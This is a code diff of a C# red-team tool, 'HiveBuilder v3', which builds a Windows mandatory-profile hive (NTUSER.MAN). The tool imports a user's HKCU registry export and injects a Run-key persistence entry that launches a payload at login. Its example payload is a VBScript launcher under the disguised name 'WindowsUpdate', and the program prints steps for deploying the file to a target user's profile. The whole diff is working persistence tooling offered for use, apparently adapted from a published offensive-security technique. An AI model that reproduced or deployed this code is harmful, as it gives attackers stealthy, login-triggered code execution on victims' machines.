@@ -3,10 +3,10 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.RegularExpressions;
-using System.Collections.Generic;
 
 class HiveBuilder
 {
+    // Offreg.dll imports for offline registry manipulation
     [DllImport("offreg.dll", CharSet = CharSet.Unicode)]
     static extern int OROpenHive(string hivePath, out IntPtr key);
 
@@ -25,6 +25,7 @@ class HiveBuilder
     [DllImport("offreg.dll")]
     static extern int ORCloseKey(IntPtr key);
 
+    // Advapi32 imports for bootstrap hive creation
     [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
     static extern int RegLoadAppKey(
         string lpFile, out IntPtr phkResult, uint samDesired, uint dwOptions, uint Reserved);
@@ -32,34 +33,67 @@ class HiveBuilder
     [DllImport("advapi32.dll")]
     static extern int RegCloseKey(IntPtr hKey);
 
-    const uint REG_KEY_READ = 0x20019;
-    const uint REG_SZ      = 1;
-    const uint REG_DWORD   = 4;
-    const uint REG_BINARY  = 3;
-    const uint REG_EXPAND_SZ = 2;
-    const uint REG_MULTI_SZ  = 7;
+    // Registry value type constants
+    const uint REG_SZ         = 1;
+    const uint REG_EXPAND_SZ  = 2;
+    const uint REG_BINARY     = 3;
+    const uint REG_DWORD      = 4;
+    const uint REG_MULTI_SZ   = 7;
+    const uint REG_KEY_READ   = 0x20019;
 
     // -------------------------------------------------------
-    // Create a key path level by level
+    // Create a registry key path level by level
     // -------------------------------------------------------
     static IntPtr CreateKeyPath(IntPtr root, string keyPath)
     {
         string[] parts = keyPath.Split('\\');
         IntPtr current = root;
+        
         foreach (string part in parts)
         {
             if (string.IsNullOrEmpty(part)) continue;
-            IntPtr next; uint disp;
-            int r = ORCreateKey(current, part, null, 0, IntPtr.Zero, out next, out disp);
-            if (r != 0) { Console.WriteLine($"  [-] ORCreateKey '{part}' failed: 0x{r:X8}"); return IntPtr.Zero; }
-            if (current != root) ORCloseKey(current);
+            
+            IntPtr next;
+            uint disposition;
+            int r = ORCreateKey(current, part, null, 0, IntPtr.Zero, out next, out disposition);
+            
+            if (r != 0)
+            {
+                Console.WriteLine($"  [-] ORCreateKey '{part}' failed: 0x{r:X8}");
+                return IntPtr.Zero;
+            }
+            
+            if (current != root)
+                ORCloseKey(current);
+                
             current = next;
         }
+        
         return current;
     }
 
     // -------------------------------------------------------
-    // Parse .reg file and replay keys/values into the hive
+    // Parse hex bytes from .reg format (handles line continuations)
+    // -------------------------------------------------------
+    static byte[] ParseHexBytes(string hexStr)
+    {
+        // Remove line continuations and whitespace
+        string clean = Regex.Replace(hexStr, @"\\\s*\r?\n\s*", "");
+        clean = clean.Replace(" ", "").Replace("\t", "");
+        
+        string[] parts = clean.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries);
+        byte[] result = new byte[parts.Length];
+        
+        for (int i = 0; i < parts.Length; i++)
+        {
+            result[i] = Convert.ToByte(parts[i].Trim(), 16);
+        }
+        
+        return result;
+    }
+
+    // -------------------------------------------------------
+    // Parse a .reg file and import all keys/values into the hive
     // -------------------------------------------------------
     static void ImportRegFile(IntPtr hiveRoot, string regFilePath)
     {
@@ -71,7 +105,7 @@ class HiveBuilder
         IntPtr currentKey = IntPtr.Zero;
         string currentKeyPath = "";
         int imported = 0;
-        int skipped  = 0;
+        int skipped = 0;
 
         foreach (string rawLine in lines)
         {
@@ -82,7 +116,7 @@ class HiveBuilder
             if (line.StartsWith("Windows Registry Editor")) continue;
             if (line.StartsWith(";")) continue;
 
-            // Section header — new key
+            // Section header — new registry key
             if (line.StartsWith("[") && line.EndsWith("]"))
             {
                 if (currentKey != IntPtr.Zero && currentKey != hiveRoot)
@@ -96,13 +130,26 @@ class HiveBuilder
                 else if (fullPath.Equals("HKEY_CURRENT_USER", StringComparison.OrdinalIgnoreCase))
                     currentKeyPath = "";
                 else
-                { currentKey = IntPtr.Zero; currentKeyPath = ""; continue; }
+                {
+                    // Not HKCU, skip
+                    currentKey = IntPtr.Zero;
+                    currentKeyPath = "";
+                    continue;
+                }
 
                 if (string.IsNullOrEmpty(currentKeyPath))
+                {
                     currentKey = hiveRoot;
+                }
                 else
+                {
                     currentKey = CreateKeyPath(hiveRoot, currentKeyPath);
-
+                    if (currentKey == IntPtr.Zero)
+                    {
+                        Console.WriteLine($"  [-] Failed to create key: {currentKeyPath}");
+                        currentKey = IntPtr.Zero;
+                    }
+                }
                 continue;
             }
 
@@ -115,7 +162,7 @@ class HiveBuilder
             string valueName = line.Substring(0, eqIdx).Trim().Trim('"');
             string valueData = line.Substring(eqIdx + 1).Trim();
 
-            // Default value name
+            // Default value name (the @ symbol)
             if (valueName == "@") valueName = "";
 
             try
@@ -123,7 +170,8 @@ class HiveBuilder
                 if (valueData.StartsWith("\""))
                 {
                     // REG_SZ
-                    string s = valueData.Trim('"').Replace("\\\"", "\"").Replace("\\\\", "\\");
+                    string s = valueData.Trim('"');
+                    s = s.Replace("\\\"", "\"").Replace("\\\\", "\\");
                     byte[] d = Encoding.Unicode.GetBytes(s + "\0");
                     ORSetValue(currentKey, valueName, REG_SZ, d, (uint)d.Length);
                     imported++;
@@ -157,9 +205,19 @@ class HiveBuilder
                     ORSetValue(currentKey, valueName, REG_BINARY, d, (uint)d.Length);
                     imported++;
                 }
-                else { skipped++; }
+                else
+                {
+                    skipped++;
+                    // Debug: Show what was skipped
+                    string preview = valueData.Length > 30 ? valueData.Substring(0, 30) + "..." : valueData;
+                    Console.WriteLine($"  [!] Skipped unknown format: {valueName} = {preview}");
+                }
             }
-            catch { skipped++; }
+            catch (Exception ex)
+            {
+                skipped++;
+                Console.WriteLine($"  [!] Error parsing {valueName}: {ex.Message}");
+            }
         }
 
         if (currentKey != IntPtr.Zero && currentKey != hiveRoot)
@@ -168,116 +226,193 @@ class HiveBuilder
         Console.WriteLine($"[+] Import complete — {imported} values imported, {skipped} skipped");
     }
 
-    static byte[] ParseHexBytes(string hexStr)
-    {
-        // Remove line continuations and whitespace
-        string clean = Regex.Replace(hexStr, @"\\\s*\r?\n\s*", "").Replace(" ", "").Replace("\t", "");
-        string[] parts = clean.Split(new char[]{','}, StringSplitOptions.RemoveEmptyEntries);
-        byte[] result = new byte[parts.Length];
-        for (int i = 0; i < parts.Length; i++)
-            result[i] = Convert.ToByte(parts[i].Trim(), 16);
-        return result;
-    }
-
     // -------------------------------------------------------
-    // Main
+    // Add a persistence Run key to the hive
     // -------------------------------------------------------
-    static void Main(string[] args)
+    static bool AddPersistenceRunKey(IntPtr hiveHandle, string payloadPath, string keyName)
     {
-        Console.WriteLine("[*] HiveBuilder v2 — with reg export import");
-        Console.WriteLine($"[*] Args received: {args.Length}");
+        Console.WriteLine($"[*] Adding persistence Run key: {keyName}");
 
-        if (args.Length < 4)
-        {
-            Console.WriteLine("");
-            Console.WriteLine("Usage:");
-            Console.WriteLine("  HiveBuilder.exe <exported.reg> <output_NTUSER.MAN> <payload_path> <key_name>");
-            Console.WriteLine("");
-            Console.WriteLine("Example:");
-            Console.WriteLine("  HiveBuilder.exe C:\\Users\\Public\\hive_export.reg NTUSER.MAN \"wscript.exe C:\\ProgramData\\launcher.vbs\" WindowsUpdate");
-            return;
-        }
-
-        string regExportPath  = args[0];
-        string outputHivePath = args[1];
-        string payloadPath    = args[2];
-        string startupKeyName = args[3];
-
-        Console.WriteLine($"[*] Input .reg  : {regExportPath}");
-        Console.WriteLine($"[*] Output hive : {outputHivePath}");
-        Console.WriteLine($"[*] Payload     : {payloadPath}");
-        Console.WriteLine($"[*] Key name    : {startupKeyName}");
-        Console.WriteLine("");
-
-        if (!File.Exists(regExportPath))
-        {
-            Console.WriteLine($"[-] Input .reg file not found: {regExportPath}");
-            return;
-        }
-
-        // Step 1: Bootstrap valid empty hive via RegLoadAppKeyW
-        Console.WriteLine("[*] Step 1: Bootstrapping hive via RegLoadAppKeyW...");
-        string bootstrapPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
-
-        IntPtr bootstrapHandle;
-        int result = RegLoadAppKey(bootstrapPath, out bootstrapHandle, REG_KEY_READ, 0, 0);
-        if (result != 0) { Console.WriteLine($"[-] RegLoadAppKeyW failed: 0x{result:X8}"); return; }
-        RegCloseKey(bootstrapHandle);
-        Console.WriteLine($"[+] Bootstrap hive created: {bootstrapPath}");
-
-        // Step 2: Open hive with Offreg.dll
-        Console.WriteLine("[*] Step 2: Opening hive with OROpenHive...");
-        IntPtr hiveHandle;
-        result = OROpenHive(bootstrapPath, out hiveHandle);
-        if (result != 0)
-        {
-            Console.WriteLine($"[-] OROpenHive failed: 0x{result:X8}");
-            try { File.Delete(bootstrapPath); } catch {}
-            return;
-        }
-        Console.WriteLine("[+] Hive opened successfully");
-
-        // Step 3: Import the full HKCU reg export
-        Console.WriteLine("[*] Step 3: Importing full HKCU structure from reg export...");
-        ImportRegFile(hiveHandle, regExportPath);
-
-        // Step 4: Inject/overwrite the Run persistence key
-        Console.WriteLine($"[*] Step 4: Injecting persistence Run key...");
         string runKeyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
         IntPtr runKeyHandle = CreateKeyPath(hiveHandle, runKeyPath);
+        
         if (runKeyHandle == IntPtr.Zero)
         {
-            ORCloseKey(hiveHandle);
-            try { File.Delete(bootstrapPath); } catch {}
-            return;
+            Console.WriteLine("[-] Failed to create/open Run key");
+            return false;
         }
+
         byte[] valueData = Encoding.Unicode.GetBytes(payloadPath + "\0");
-        result = ORSetValue(runKeyHandle, startupKeyName, REG_SZ, valueData, (uint)valueData.Length);
+        int result = ORSetValue(runKeyHandle, keyName, REG_SZ, valueData, (uint)valueData.Length);
         ORCloseKey(runKeyHandle);
 
         if (result != 0)
         {
             Console.WriteLine($"[-] ORSetValue failed: 0x{result:X8}");
-            ORCloseKey(hiveHandle);
-            try { File.Delete(bootstrapPath); } catch {}
+            return false;
+        }
+
+        Console.WriteLine($"[+] Persistence value written: {keyName} = {payloadPath}");
+        return true;
+    }
+
+    // -------------------------------------------------------
+    // Bootstrap: Create a valid empty hive using RegLoadAppKey
+    // This is critical - ORCreateHive alone doesn't produce
+    // a hive Windows will accept
+    // -------------------------------------------------------
+    static string CreateBootstrapHive()
+    {
+        Console.WriteLine("[*] Creating bootstrap hive via RegLoadAppKey...");
+        string bootstrapPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
+
+        IntPtr bootstrapHandle;
+        int result = RegLoadAppKey(bootstrapPath, out bootstrapHandle, REG_KEY_READ, 0, 0);
+        
+        if (result != 0)
+        {
+            Console.WriteLine($"[-] RegLoadAppKey failed: 0x{result:X8}");
+            return null;
+        }
+
+        RegCloseKey(bootstrapHandle);
+        Console.WriteLine($"[+] Bootstrap hive created: {bootstrapPath}");
+        return bootstrapPath;
+    }
+
+    // -------------------------------------------------------
+    // Main entry point
+    // -------------------------------------------------------
+    static void Main(string[] args)
+    {
+        Console.WriteLine("╔═══════════════════════════════════════════════════════════════╗");
+        Console.WriteLine("║     HiveBuilder v3 — Mandatory Profile Hive Generator         ║");
+        Console.WriteLine("║     Based on Praetorian's Swarmer technique                  ║");
+        Console.WriteLine("║     https://www.praetorian.com/blog/corrupting-the-hive-mind ║");
+        Console.WriteLine("╚═══════════════════════════════════════════════════════════════╝");
+        Console.WriteLine();
+
+        if (args.Length < 4)
+        {
+            Console.WriteLine("USAGE:");
+            Console.WriteLine("  HiveBuilder.exe <exported.reg> <output.NTUSER.MAN> <payload_path> <key_name>");
+            Console.WriteLine();
+            Console.WriteLine("ARGUMENTS:");
+            Console.WriteLine("  exported.reg     - Path to HKCU registry export (reg export HKCU file.reg)");
+            Console.WriteLine("  output_hive      - Output path for NTUSER.MAN file");
+            Console.WriteLine("  payload_path     - Command to execute at user login");
+            Console.WriteLine("  key_name         - Name for the Run registry value");
+            Console.WriteLine();
+            Console.WriteLine("EXAMPLE:");
+            Console.WriteLine("  HiveBuilder.exe C:\\Users\\Public\\hive_export.reg NTUSER.MAN \"wscript.exe C:\\ProgramData\\launcher.vbs\" WindowsUpdate");
+            Console.WriteLine();
+            Console.WriteLine("  This creates NTUSER.MAN with a Run key that executes the payload");
+            Console.WriteLine("  when the user logs in.");
             return;
         }
-        Console.WriteLine($"[+] Persistence value written: {startupKeyName} = {payloadPath}");
 
-        // Step 5: Save hive
-        Console.WriteLine($"[*] Step 5: Saving hive to {outputHivePath}...");
-        if (File.Exists(outputHivePath)) File.Delete(outputHivePath);
+        string regExportPath = args[0];
+        string outputHivePath = args[1];
+        string payloadPath = args[2];
+        string startupKeyName = args[3];
+
+        Console.WriteLine("[*] Configuration:");
+        Console.WriteLine($"    Input .reg   : {regExportPath}");
+        Console.WriteLine($"    Output hive  : {outputHivePath}");
+        Console.WriteLine($"    Payload      : {payloadPath}");
+        Console.WriteLine($"    Key name     : {startupKeyName}");
+        Console.WriteLine();
+
+        // Validate inputs
+        if (!File.Exists(regExportPath))
+        {
+            Console.WriteLine($"[-] ERROR: Input .reg file not found: {regExportPath}");
+            Console.WriteLine("[*] Run: reg export HKCU C:\\path\\to\\export.reg /y");
+            return;
+        }
+
+        // Step 1: Create bootstrap hive using RegLoadAppKey
+        string bootstrapPath = CreateBootstrapHive();
+        if (bootstrapPath == null)
+        {
+            Console.WriteLine("[-] Failed to create bootstrap hive");
+            return;
+        }
+
+        // Step 2: Open the bootstrap hive with Offreg.dll
+        Console.WriteLine("[*] Opening bootstrap hive with OROpenHive...");
+        IntPtr hiveHandle;
+        int result = OROpenHive(bootstrapPath, out hiveHandle);
+        
+        if (result != 0)
+        {
+            Console.WriteLine($"[-] OROpenHive failed: 0x{result:X8}");
+            try { File.Delete(bootstrapPath); } catch { }
+            return;
+        }
+        Console.WriteLine("[+] Hive opened successfully");
+
+        // Step 3: Import the entire .reg file
+        ImportRegFile(hiveHandle, regExportPath);
+
+        // Step 4: Add the persistence Run key
+        if (!AddPersistenceRunKey(hiveHandle, payloadPath, startupKeyName))
+        {
+            ORCloseKey(hiveHandle);
+            try { File.Delete(bootstrapPath); } catch { }
+            return;
+        }
+
+        // Step 5: Save the modified hive
+        Console.WriteLine($"[*] Saving hive to {outputHivePath}...");
+        
+        if (File.Exists(outputHivePath))
+        {
+            try { File.Delete(outputHivePath); } catch { }
+        }
 
         result = ORSaveHive(hiveHandle, outputHivePath, 10, 0);
         ORCloseKey(hiveHandle);
-        try { File.Delete(bootstrapPath); } catch {}
+        
+        try { File.Delete(bootstrapPath); } catch { }
 
-        if (result != 0) { Console.WriteLine($"[-] ORSaveHive failed: 0x{result:X8}"); return; }
+        if (result != 0)
+        {
+            Console.WriteLine($"[-] ORSaveHive failed: 0x{result:X8}");
+            return;
+        }
 
-        Console.WriteLine("");
-        Console.WriteLine($"[+] SUCCESS: NTUSER.MAN written to {outputHivePath}");
-        Console.WriteLine($"[+] Hive size  : {new FileInfo(outputHivePath).Length / 1024} KB");
-        Console.WriteLine($"[+] Persistence: {startupKeyName} = {payloadPath}");
-        Console.WriteLine("[*] Next: Copy NTUSER.MAN to %USERPROFILE% then log off and back in");
+        // Step 6: Display success and file info
+        FileInfo outputInfo = new FileInfo(outputHivePath);
+        
+        Console.WriteLine();
+        Console.WriteLine("[✓] SUCCESS!");
+        Console.WriteLine($"    File: {outputHivePath}");
+        Console.WriteLine($"    Size: {outputInfo.Length / 1024} KB");
+        Console.WriteLine($"    Run key: {startupKeyName} = {payloadPath}");
+        
+        // Validate size
+        if (outputInfo.Length < 10240) // Less than 10KB
+        {
+            Console.WriteLine();
+            Console.WriteLine("[!] WARNING: Generated hive is very small (<10KB)");
+            Console.WriteLine("[!] The .reg import may have failed. Check the skipped values count above.");
+            Console.WriteLine("[!] The user may not be able to log in with this hive.");
+        }
+        else
+        {
+            Console.WriteLine();
+            Console.WriteLine("[*] Hive size looks good. Ready for deployment.");
+        }
+
+        Console.WriteLine();
+        Console.WriteLine("[*] DEPLOYMENT STEPS:");
+        Console.WriteLine("    1. Ensure target user is logged out completely");
+        Console.WriteLine("    2. Copy NTUSER.MAN to %USERPROFILE%\\NTUSER.MAN");
+        Console.WriteLine("    3. Log in as the target user");
+        Console.WriteLine("    4. Verify with: Get-Content C:\\ProgramData\\persistence_log.txt");
+        Console.WriteLine();
+        Console.WriteLine("[*] To restore original profile (if needed):");
+        Console.WriteLine("    Delete %USERPROFILE%\\NTUSER.MAN and log in again");
     }
 }
